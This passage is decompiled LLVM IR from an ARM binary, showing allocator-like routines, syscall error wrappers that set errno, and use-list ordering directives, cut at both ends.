  %v3_15190 = inttoptr i32 %v2_15190 to i32*
  store i32 %v0_15190, i32* %v3_15190, align 4
  %v0_15194 = load i32, i32* %r0.global-to-local, align 4
  %v1_15194 = load i32, i32* %r1.global-to-local, align 4
  %v2_15194 = add i32 %v1_15194, %v0_15194
  store i32 %v2_15194, i32* %r2.global-to-local, align 4
  %v1_15198 = add i32 %v2_15194, 4
  %v2_15198 = inttoptr i32 %v1_15198 to i32*
  %v3_15198 = load i32, i32* %v2_15198, align 4
  %v1_1519c = or i32 %v3_15198, 1
  store i32 %v1_1519c, i32* %r3.global-to-local, align 4
  store i32 %v1_1519c, i32* %v2_15198, align 4
  %v0_151a4 = load i32, i32* %r0.global-to-local, align 4
  %v1_151a4 = add i32 %v0_151a4, 8
  store i32 %v1_151a4, i32* @r0, align 4
  %v0_151a8 = call i32 @function_108e4()
  store i32 %v0_151a8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_151ac

dec_label_pc_151ac:                               ; preds = %dec_label_pc_1515c, %dec_label_pc_1517c
  %v0_151ac = load i32, i32* @sl, align 4
  %v1_151ac = add i32 %v0_151ac, 8
  store i32 %v1_151ac, i32* @r4, align 4
  br label %dec_label_pc_15280

dec_label_pc_151b4:                               ; preds = %bb29
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 142044, i32* %r1.global-to-local, align 4
  %v4_151bc = load i32, i32* inttoptr (i32 142076 to i32*), align 4
  store i32 %v4_151bc, i32* @r8, align 4
  %v2_151c0 = inttoptr i32 %v1_14fd0 to i32*
  %v3_151c0 = load i32, i32* %v2_151c0, align 4
  store i32 %v3_151c0, i32* @r4, align 4
  %v1_151c4 = add i32 %v4_151bc, 860
  %v2_151c4 = inttoptr i32 %v1_151c4 to i32*
  %v3_151c4 = load i32, i32* %v2_151c4, align 4
  %v1_151c8 = add i32 %v3_151c0, 4
  %v1_151cc = add i32 %v3_151c4, -1
  store i32 %v1_151cc, i32* %r2.global-to-local, align 4
  %v2_151d0 = add i32 %v1_151c8, %v1_151cc
  %v1_151d4 = load i32, i32* @sb, align 4
  %v2_151d4 = add i32 %v2_151d0, %v1_151d4
  store i32 %v2_151d4, i32* %r3.global-to-local, align 4
  %v2_151d8 = sub i32 0, %v3_151c4
  %v3_151d8 = and i32 %v2_151d4, %v2_151d8
  store i32 %v3_151d8, i32* @r7, align 4
  %v2_151dc = sub i32 %v3_151d8, %v3_151c0
  store i32 %v2_151dc, i32* @fp, align 4
  %v9_151e0 = icmp eq i32 %v1_14fd4, %v2_151dc
  br i1 %v9_151e0, label %dec_label_pc_15254, label %dec_label_pc_151e8

dec_label_pc_151e8:                               ; preds = %dec_label_pc_151b4
  %v2_151e8 = sub i32 %v1_14fd0, %v3_151c0
  store i32 %v2_151e8, i32* %r0.global-to-local, align 4
  %v2_151ec = add i32 %v3_151c0, %v1_14fd4
  store i32 %v2_151ec, i32* %r1.global-to-local, align 4
  store i32 %v3_151d8, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_151f8 = call i32 @function_15634(i32 %v2_151e8, i32 %v2_151ec, i32 %v3_151d8, i32 1)
  store i32 %v4_151f8, i32* %r0.global-to-local, align 4
  %v7_151fc = icmp eq i32 %v4_151f8, -1
  br i1 %v7_151fc, label %dec_label_pc_15248, label %dec_label_pc_15204

dec_label_pc_15204:                               ; preds = %dec_label_pc_151e8
  %v1_15204 = load i32, i32* @r4, align 4
  %v2_15204 = add i32 %v1_15204, %v4_151f8
  store i32 %v2_15204, i32* %r0.global-to-local, align 4
  %v0_15208 = load i32, i32* @fp, align 4
  %v1_15208 = or i32 %v0_15208, 2
  store i32 %v1_15208, i32* %r3.global-to-local, align 4
  %v2_1520c = add i32 %v2_15204, 4
  %v3_1520c = inttoptr i32 %v2_1520c to i32*
  store i32 %v1_15208, i32* %v3_1520c, align 4
  %v0_15210 = load i32, i32* @r8, align 4
  %v1_15210 = add i32 %v0_15210, 868
  %v2_15210 = inttoptr i32 %v1_15210 to i32*
  %v3_15210 = load i32, i32* %v2_15210, align 4
  store i32 %v3_15210, i32* %r3.global-to-local, align 4
  %v1_15214 = add i32 %v0_15210, 880
  %v2_15214 = inttoptr i32 %v1_15214 to i32*
  %v3_15214 = load i32, i32* %v2_15214, align 4
  store i32 %v3_15214, i32* %r2.global-to-local, align 4
  %v0_15218 = load i32, i32* @r6, align 4
  %v2_15218 = sub i32 %v3_15210, %v0_15218
  store i32 %v2_15218, i32* %r3.global-to-local, align 4
  %v1_1521c = load i32, i32* @r7, align 4
  %v2_1521c = add i32 %v1_1521c, %v2_15218
  store i32 %v2_1521c, i32* %r1.global-to-local, align 4
  %v1_15220 = add i32 %v0_15210, 872
  %v2_15220 = inttoptr i32 %v1_15220 to i32*
  %v3_15220 = load i32, i32* %v2_15220, align 4
  store i32 %v3_15220, i32* %r3.global-to-local, align 4
  %v1_15228 = add i32 %v0_15210, 884
  %v2_15228 = inttoptr i32 %v1_15228 to i32*
  %v3_15228 = load i32, i32* %v2_15228, align 4
  store i32 %v3_15228, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_1521c, %v3_15214
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_15204
  store i32 %v2_1521c, i32* %v2_15214, align 4
  %v0_15230.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_15230.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_15204, %bb33
  %v1_15230 = phi i32 [ %v0_15210, %dec_label_pc_15204 ], [ %v1_15230.pre, %bb33 ]
  %v0_15230 = phi i32 [ %v2_1521c, %dec_label_pc_15204 ], [ %v0_15230.pre, %bb33 ]
  %v2_15230 = add i32 %v1_15230, 868
  %v3_15230 = inttoptr i32 %v2_15230 to i32*
  store i32 %v0_15230, i32* %v3_15230, align 4
  %v0_15234 = load i32, i32* %r1.global-to-local, align 4
  %v1_15234 = load i32, i32* %r3.global-to-local, align 4
  %v2_15234 = add i32 %v1_15234, %v0_15234
  store i32 %v2_15234, i32* %r1.global-to-local, align 4
  %v1_15238 = load i32, i32* %r2.global-to-local, align 4
  %v0_1523c = load i32, i32* %r0.global-to-local, align 4
  %v1_1523c = add i32 %v0_1523c, 8
  store i32 %v1_1523c, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_15234, %v1_15238
  br i1 %tmp43, label %bb35, label %dec_label_pc_15280

bb35:                                             ; preds = %bb34
  %v5_15240 = load i32, i32* @r8, align 4
  %v6_15240 = add i32 %v5_15240, 884
  %v7_15240 = inttoptr i32 %v6_15240 to i32*
  store i32 %v2_15234, i32* %v7_15240, align 4
  br label %dec_label_pc_15280

dec_label_pc_15248:                               ; preds = %dec_label_pc_151e8
  %v0_15248 = load i32, i32* @sb, align 4
  %v1_15248 = add i32 %v0_15248, 4
  store i32 %v1_15248, i32* %r3.global-to-local, align 4
  %v0_1524c = load i32, i32* @r6, align 4
  %v3_1524c = icmp ult i32 %v0_1524c, %v1_15248
  br i1 %v3_1524c, label %dec_label_pc_1525c, label %dec_label_pc_15248.dec_label_pc_15254_crit_edge

dec_label_pc_15248.dec_label_pc_15254_crit_edge:  ; preds = %dec_label_pc_15248
  %v0_15254.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_15254

dec_label_pc_15254:                               ; preds = %dec_label_pc_15248.dec_label_pc_15254_crit_edge, %dec_label_pc_151b4
  %v0_15254 = phi i32 [ %v0_15254.pre, %dec_label_pc_15248.dec_label_pc_15254_crit_edge ], [ %v0_14fbc, %dec_label_pc_151b4 ]
  store i32 %v0_15254, i32* @r4, align 4
  br label %dec_label_pc_15280

dec_label_pc_1525c:                               ; preds = %dec_label_pc_15248
  %v1_1525c = add i32 %v0_15248, -7
  store i32 %v1_1525c, i32* %r0.global-to-local, align 4
  %v1_15260 = call i32 @function_fd60(i32 %v1_1525c)
  store i32 %v1_15260, i32* @r0, align 4
  store i32 %v1_15260, i32* @r4, align 4
  %v2_15264 = icmp eq i32 %v1_15260, 0
  br i1 %v2_15264, label %dec_label_pc_15280, label %dec_label_pc_1526c

dec_label_pc_1526c:                               ; preds = %dec_label_pc_1525c
  %v0_1526c = load i32, i32* @r6, align 4
  %v1_1526c = add i32 %v0_1526c, -8
  store i32 %v1_1526c, i32* @r2, align 4
  %v0_15270 = load i32, i32* @r5, align 4
  store i32 %v0_15270, i32* @r1, align 4
  %v0_15274 = call i32 @function_f350()
  %v0_15278 = load i32, i32* @r5, align 4
  store i32 %v0_15278, i32* @r0, align 4
  %v0_1527c = call i32 @function_108e4()
  store i32 %v0_1527c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_15280

dec_label_pc_15280:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_1525c, %dec_label_pc_15254, %dec_label_pc_151ac, %.thread6, %dec_label_pc_1501c, %dec_label_pc_1526c
  store i32 %v2_14f70, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* %r3.global-to-local, align 4
  store i32 142044, i32* %r2.global-to-local, align 4
  %v4_15290 = load i32, i32* inttoptr (i32 142068 to i32*), align 4
  store i32 %v4_15290, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_15290)
  br label %dec_label_pc_1529c

dec_label_pc_1529c:                               ; preds = %dec_label_pc_14fa4, %dec_label_pc_14f4c, %dec_label_pc_14f34, %dec_label_pc_15280
  %v0_1529c = load i32, i32* @r4, align 4
  store i32 %v0_1529c, i32* %r0.global-to-local, align 4
  store i32 %v3_14f14, i32* @r4, align 4
  store i32 %v6_14f14, i32* @r5, align 4
  store i32 %v9_14f14, i32* @r6, align 4
  store i32 %v12_14f14, i32* @r7, align 4
  store i32 %v15_14f14, i32* @r8, align 4
  store i32 %v18_14f14, i32* @sb, align 4
  store i32 %v21_14f14, i32* @sl, align 4
  store i32 %v24_14f14, i32* @fp, align 4
  store i32 %v27_14f14, i32* @lr, align 4
  ret i32 %v0_1529c

; uselistorder directives
  uselistorder i32 %v2_15234, { 1, 0, 2 }
  uselistorder i32 %v2_1521c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_151f8, { 1, 0, 2 }
  uselistorder i32 %v3_151d8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1517c, { 2, 1, 0 }
  uselistorder i32 %v2_1514c, { 1, 0, 2 }
  uselistorder i32 %v0_150e0, { 1, 0 }
  uselistorder i32 %v1_1509c, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_15000, { 0, 2, 1, 3 }
  uselistorder i32 %v2_14ff8, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_14fdc, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_14fd4, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_14fd0, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_14fc0, { 1, 0 }
  uselistorder i32 %v0_14fbc, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_14f9c, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 4, 3, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 30, 6, 11, 7, 8, 9, 10, 22, 12, 14, 13, 15, 21, 23, 16, 17, 18, 19, 20, 26, 25, 24, 27, 29, 28 }
  uselistorder i32* inttoptr (i32 142068 to i32*), { 0, 2, 1 }
  uselistorder i32 868, { 2, 3, 0, 1, 4, 5, 6, 7 }
  uselistorder i32 860, { 4, 0, 1, 2, 3, 6, 5, 7 }
  uselistorder i32 ()* @function_10b60, { 6, 1, 0, 5, 4, 3, 2 }
  uselistorder i32* inttoptr (i32 142076 to i32*), { 2, 1, 17, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 3 }
  uselistorder i32* inttoptr (i32 142060 to i32*), { 0, 4, 3, 2, 1 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_1529c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_15280, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_151ac, { 1, 0 }
  uselistorder label %dec_label_pc_1514c, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_15098, { 1, 2, 0 }
  uselistorder label %dec_label_pc_1508c, { 1, 0 }
  uselistorder label %dec_label_pc_15088, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_152b0(i32 %arg1) local_unnamed_addr {
dec_label_pc_152b0:
  %v0_152b0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_152b0, label %bb, label %.thread4

bb:                                               ; preds = %dec_label_pc_152b0
  br label %.thread4

.thread4:                                         ; preds = %dec_label_pc_152b0, %bb
  %v10_152c4 = phi i32 [ %arg1, %dec_label_pc_152b0 ], [ 0, %bb ]
  ret i32 %v10_152c4

; uselistorder directives
  uselistorder label %.thread4, { 1, 0 }
}

define i32 @function_152c8(i32 %arg1) local_unnamed_addr {
dec_label_pc_152c8:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 142044, i32* %r2.global-to-local, align 4
  %v4_152d4 = load i32, i32* inttoptr (i32 142148 to i32*), align 4
  %v4_152dc = load i32, i32* inttoptr (i32 142112 to i32*), align 32
  store i32 %v4_152dc, i32* %r1.global-to-local, align 4
  %v1_152e0 = add i32 %arg1, 44
  %v2_152e0 = inttoptr i32 %v1_152e0 to i32*
  %v3_152e0 = load i32, i32* %v2_152e0, align 4
  %v1_152e4 = add i32 %arg1, 28
  %v2_152e4 = inttoptr i32 %v1_152e4 to i32*
  %v3_152e4 = load i32, i32* %v2_152e4, align 4
  store i32 %v3_152e4, i32* %r2.global-to-local, align 4
  %v2_152e8 = inttoptr i32 %v4_152d4 to i32*
  store i32 %v3_152e0, i32* %v2_152e8, align 4
  %v0_152ec = load i32, i32* %r2.global-to-local, align 4
  %v1_152ec = load i32, i32* %r1.global-to-local, align 4
  %v2_152ec = inttoptr i32 %v1_152ec to i32*
  store i32 %v0_152ec, i32* %v2_152ec, align 4
  ret i32 %arg1

; uselistorder directives
  uselistorder i32 %arg1, { 0, 2, 1 }
}

define i32 @function_152f8(i32 %arg1) local_unnamed_addr {
dec_label_pc_152f8:
  %v0_152f8 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_152f8, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_152f8
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_152f8, %bb
  %v4_152fc = phi i32 [ %arg1, %dec_label_pc_152f8 ], [ 0, %bb ]
  ret i32 %v4_152fc

; uselistorder directives
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_15300(i32 %arg1) local_unnamed_addr {
dec_label_pc_1533c:
  store i32 %arg1, i32* @global_var_254dc.553, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* @global_var_254dc.553, { 1, 0, 2 }
}

define i32 @function_1534c() local_unnamed_addr {
dec_label_pc_1534c:
  %stack_var_-8 = alloca i32, align 4
  %v3_1534c = load i32, i32* @r4, align 4
  store i32 %v3_1534c, i32* %stack_var_-8, align 4
  %v0_15350 = load i32, i32* @r0, align 4
  %v0_15354 = call i32 @function_ce08()
  %v1_15358 = sub i32 0, %v0_15350
  %v2_1535c = inttoptr i32 %v0_15354 to i32*
  store i32 %v1_15358, i32* %v2_1535c, align 4
  %v2_15364 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_15364, i32* @r4, align 4
  ret i32 -1
}

define i32 @function_15378(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_15378:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_15378 = load i32, i32* @r7, align 4
  store i32 %v3_15378, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_153a0, label %dec_label_pc_15390

dec_label_pc_15390:                               ; preds = %dec_label_pc_15378
  %v0_15390 = call i32 @function_ce08()
  %v0_15394 = load i32, i32* %r7.global-to-local, align 4
  %v1_15394 = sub i32 0, %v0_15394
  %v2_15398 = inttoptr i32 %v0_15390 to i32*
  store i32 %v1_15394, i32* %v2_15398, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_153a4.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_153a0

dec_label_pc_153a0:                               ; preds = %dec_label_pc_15378, %dec_label_pc_15390
  %v2_153a4 = phi i32 [ %v3_15378, %dec_label_pc_15378 ], [ %v2_153a4.pre, %dec_label_pc_15390 ]
  %v0_153a0 = phi i32 [ %arg1, %dec_label_pc_15378 ], [ -1, %dec_label_pc_15390 ]
  store i32 %v2_153a4, i32* %r7.global-to-local, align 4
  ret i32 %v0_153a0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_153a0, { 1, 0 }
}

define i32 @function_153ac() local_unnamed_addr {
dec_label_pc_153ac:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %tmp = call i16 @__decompiler_undefined_function_2()
  %tmp4 = call i16 @__decompiler_undefined_function_2()
  %tmp5 = call i16 @__decompiler_undefined_function_2()
  %tmp6 = call i16 @__decompiler_undefined_function_2()
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-72 = alloca i32, align 4
  %v3_153ac = load i32, i32* @r7, align 4
  %v6_153ac = load i32, i32* @lr, align 4
  %v2_153b0 = ptrtoint i32* %stack_var_-72 to i32
  %v0_153b4 = load i32, i32* @r1, align 4
  store i32 %v0_153b4, i32* @r3, align 4
  store i32 %v2_153b0, i32* %r1.global-to-local, align 4
  %v0_153c4 = load i32, i32* @r0, align 4
  store i32 %v0_153c4, i32* %r7.global-to-local, align 4
  %tmp32 = icmp ult i32 %v0_153c4, -4095
  br i1 %tmp32, label %dec_label_pc_153e4, label %dec_label_pc_153d0

dec_label_pc_153d0:                               ; preds = %dec_label_pc_153ac
  %v0_153d0 = call i32 @function_ce08()
  %v0_153d4 = load i32, i32* %r7.global-to-local, align 4
  %v1_153d4 = sub i32 0, %v0_153d4
  store i32 %v1_153d4, i32* @r3, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_153dc = inttoptr i32 %v0_153d0 to i32*
  store i32 %v1_153d4, i32* %v2_153dc, align 4
  %v0_153f4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_153f4

dec_label_pc_153e4:                               ; preds = %dec_label_pc_153ac
  %v2_153e4 = icmp eq i32 %v0_153c4, 0
  store i32 87028, i32* %lr.global-to-local, align 4
  br i1 %v2_153e4, label %dec_label_pc_1557c, label %dec_label_pc_153f4

dec_label_pc_153f4:                               ; preds = %dec_label_pc_153e4, %dec_label_pc_153d0
  %v0_153f4 = phi i32 [ %v0_153f4.pre, %dec_label_pc_153d0 ], [ %v0_153c4, %dec_label_pc_153e4 ]
  store i32 %v3_153ac, i32* @r7, align 4
  store i32 %v6_153ac, i32* @lr, align 4
  ret i32 %v0_153f4

dec_label_pc_1557c:                               ; preds = %dec_label_pc_153e4
  %v3_1557c = load i32, i32* @r4, align 4
  %v6_1557c = load i32, i32* @r5, align 4
  %v9_1557c = load i32, i32* @r6, align 4
  %v15_1557c = load i32, i32* @r8, align 4
  %v18_1557c = load i32, i32* @sb, align 4
  store i32 %v0_153b4, i32* %r5.global-to-local, align 4
  store i32 %v2_153b0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  store i32 88, i32* @r2, align 4
  %v2_15598 = inttoptr i32 %v0_153b4 to i8*
  %v3_15598 = call i32 @function_f240(i8* %v2_15598, i32 0)
  %v2_155a0 = load i32, i32* %stack_var_-72, align 4
  store i32 %v2_155a0, i32* %r8.global-to-local, align 4
  %v1_155a4 = load i32, i32* %r5.global-to-local, align 4
  %v2_155a4 = add i32 %v1_155a4, 12
  %v3_155a4 = inttoptr i32 %v2_155a4 to i32*
  %v1_155b0 = load i32, i32* %r5.global-to-local, align 4
  %v2_155b0 = add i32 %v1_155b0, 44
  %v3_155b0 = inttoptr i32 %v2_155b0 to i32*
  %v1_155b8 = load i32, i32* %r5.global-to-local, align 4
  %v2_155b8 = add i32 %v1_155b8, 48
  %v3_155b8 = inttoptr i32 %v2_155b8 to i32*
  %v1_155c0 = load i32, i32* %r5.global-to-local, align 4
  %v2_155c0 = add i32 %v1_155c0, 52
  %v3_155c0 = inttoptr i32 %v2_155c0 to i32*
  %v0_155cc = load i32, i32* %r5.global-to-local, align 4
  %v1_155cc = add i32 %v0_155cc, 56
  %v1_155d0 = inttoptr i32 %v1_155cc to i32*
  %v3_155d0 = add i32 %v0_155cc, 60
  %v4_155d0 = inttoptr i32 %v3_155d0 to i32*
  %v5_155d0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_155d0, i32* %v4_155d0, align 4
  %v0_155dc = load i32, i32* %r5.global-to-local, align 4
  %v1_155dc = add i32 %v0_155dc, 64
  %v1_155e0 = inttoptr i32 %v1_155dc to i32*
  %v3_155e0 = add i32 %v0_155dc, 68
  %v4_155e0 = inttoptr i32 %v3_155e0 to i32*
  %v5_155e0 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_155e0, i32* %v4_155e0, align 4
  %v4_155ec = zext i16 %tmp6 to i32
  store i32 %v4_155ec, i32* %r2.global-to-local, align 4
  %v4_155f0 = zext i16 %tmp5 to i32
  store i32 %v4_155f0, i32* %ip.global-to-local, align 4
  %v4_155f4 = zext i16 %tmp4 to i32
  store i32 %v4_155f4, i32* %lr.global-to-local, align 4
  %v4_155f8 = zext i16 %tmp to i32
  store i32 %v4_155f8, i32* %r4.global-to-local, align 4
  store i32 0, i32* %sb.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_15604 = load i32, i32* %r5.global-to-local, align 4
  %v1_15604 = add i32 %v0_15604, 72
  store i32 %v1_15604, i32* @r3, align 4
  %v1_15608 = inttoptr i32 %v1_15604 to i32*
  store i32 %tmp28, i32* %v1_15608, align 4
  %v3_15608 = add i32 %v0_15604, 76
  %v4_15608 = inttoptr i32 %v3_15608 to i32*
  %v5_15608 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v5_15608, i32* %v4_15608, align 4
  %v0_1560c = load i32, i32* %r5.global-to-local, align 4
  %v1_1560c = inttoptr i32 %v0_1560c to i32*
  %v2_1560c = load i32, i32* %r8.global-to-local, align 4
  store i32 %v2_1560c, i32* %v1_1560c, align 4
  %v3_1560c = add i32 %v0_1560c, 4
  %v4_1560c = inttoptr i32 %v3_1560c to i32*
  %v5_1560c = load i32, i32* %sb.global-to-local, align 4
  store i32 %v5_1560c, i32* %v4_1560c, align 4
  %v0_15610 = load i32, i32* %r6.global-to-local, align 4
  %v1_15610 = load i32, i32* %r5.global-to-local, align 4
  %v2_15610 = add i32 %v1_15610, 32
  %v3_15610 = inttoptr i32 %v2_15610 to i32*
  store i32 %v0_15610, i32* %v3_15610, align 4
  %v0_15614 = load i32, i32* %r7.global-to-local, align 4
  %v1_15614 = load i32, i32* %r5.global-to-local, align 4
  %v2_15614 = add i32 %v1_15614, 36
  %v3_15614 = inttoptr i32 %v2_15614 to i32*
  store i32 %v0_15614, i32* %v3_15614, align 4
  %v0_15618 = load i32, i32* %r2.global-to-local, align 4
  %v1_15618 = load i32, i32* %r5.global-to-local, align 4
  %v2_15618 = add i32 %v1_15618, 16
  %v3_15618 = inttoptr i32 %v2_15618 to i32*
  store i32 %v0_15618, i32* %v3_15618, align 4
  %v0_1561c = load i32, i32* %ip.global-to-local, align 4
  %v1_1561c = load i32, i32* %r5.global-to-local, align 4
  %v2_1561c = add i32 %v1_1561c, 20
  %v3_1561c = inttoptr i32 %v2_1561c to i32*
  store i32 %v0_1561c, i32* %v3_1561c, align 4
  %v0_15620 = load i32, i32* %lr.global-to-local, align 4
  %v1_15620 = load i32, i32* %r5.global-to-local, align 4
  %v2_15620 = add i32 %v1_15620, 24
  %v3_15620 = inttoptr i32 %v2_15620 to i32*
  store i32 %v0_15620, i32* %v3_15620, align 4
  %v0_15624 = load i32, i32* %r4.global-to-local, align 4
  %v1_15624 = load i32, i32* %r5.global-to-local, align 4
  %v2_15624 = add i32 %v1_15624, 28
  %v3_15624 = inttoptr i32 %v2_15624 to i32*
  store i32 %v0_15624, i32* %v3_15624, align 4
  store i32 %v3_1557c, i32* @r4, align 4
  store i32 %v6_1557c, i32* @r5, align 4
  store i32 %v9_1557c, i32* @r6, align 4
  store i32 0, i32* @r7, align 4
  store i32 %v15_1557c, i32* @r8, align 4
  store i32 %v18_1557c, i32* @sb, align 4
  store i32 87028, i32* @lr, align 4
  ret i32 %tmp28

; uselistorder directives
  uselistorder i32 %v0_153c4, { 1, 2, 0, 3 }
  uselistorder i32 %v0_153b4, { 1, 0, 2 }
  uselistorder i32 %tmp28, { 1, 0 }
  uselistorder i32* %r7.global-to-local, { 4, 5, 0, 1, 2, 3 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %lr.global-to-local, { 1, 2, 0 }
  uselistorder i32 72, { 4, 0, 1, 2, 7, 3, 5, 6 }
  uselistorder i32 60, { 3, 4, 0, 5, 6, 1, 2, 7 }
}

define i32 @function_15634(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15634:
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_15668, label %dec_label_pc_15658

dec_label_pc_15658:                               ; preds = %dec_label_pc_15634
  %v0_15658 = call i32 @function_ce08()
  %v0_1565c = load i32, i32* %r4.global-to-local, align 4
  %v1_1565c = sub i32 0, %v0_1565c
  %v2_15660 = inttoptr i32 %v0_15658 to i32*
  store i32 %v1_1565c, i32* %v2_15660, align 4
  br label %dec_label_pc_15668

dec_label_pc_15668:                               ; preds = %dec_label_pc_15634, %dec_label_pc_15658
  %v1_15670 = phi i32 [ %arg1, %dec_label_pc_15634 ], [ -1, %dec_label_pc_15658 ]
  ret i32 %v1_15670

; uselistorder directives
  uselistorder i32 %arg1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_15668, { 1, 0 }
}

define i32 @function_15674(i32 %arg1, i32* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_15674:
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg2 to i32
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %stack_var_-72 = alloca i32, align 4
  %v3_15678 = load i32, i32* @r4, align 4
  %v6_15678 = load i32, i32* @r5, align 4
  %v12_15678 = load i32, i32* @r7, align 4
  %v1_1567c = add i32 %arg3, 14
  %v2_15684 = ptrtoint i32* %stack_var_-72 to i32
  %v1_15688 = and i32 %v1_1567c, -8
  %v2_1568c = sub i32 %v2_15684, %v1_15688
  %v1_15690 = add i32 %v2_1568c, 8
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %tmp, i32* @r5, align 4
  store i32 %v1_15690, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp25 = icmp ult i32 %arg1, -4095
  br i1 %tmp25, label %dec_label_pc_156cc, label %dec_label_pc_156b8

dec_label_pc_156b8:                               ; preds = %dec_label_pc_15674
  %v0_156b8 = call i32 @function_ce08()
  %v0_156bc = load i32, i32* %r4.global-to-local, align 4
  %v1_156bc = sub i32 0, %v0_156bc
  store i32 -1, i32* %r4.global-to-local, align 4
  %v2_156c4 = inttoptr i32 %v0_156b8 to i32*
  store i32 %v1_156bc, i32* %v2_156c4, align 4
  %v0_156d4.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_156d4

dec_label_pc_156cc:                               ; preds = %dec_label_pc_15674
  br i1 false, label %dec_label_pc_156d4, label %dec_label_pc_156dc

dec_label_pc_156d4:                               ; preds = %dec_label_pc_156cc, %dec_label_pc_156b8
  %v0_156d4 = phi i32 [ -1, %dec_label_pc_156cc ], [ %v0_156d4.pre, %dec_label_pc_156b8 ]
  store i32 %v0_156d4, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_157a8

dec_label_pc_156dc:                               ; preds = %dec_label_pc_156cc
  %v2_156dc = add i32 %v1_15690, %arg1
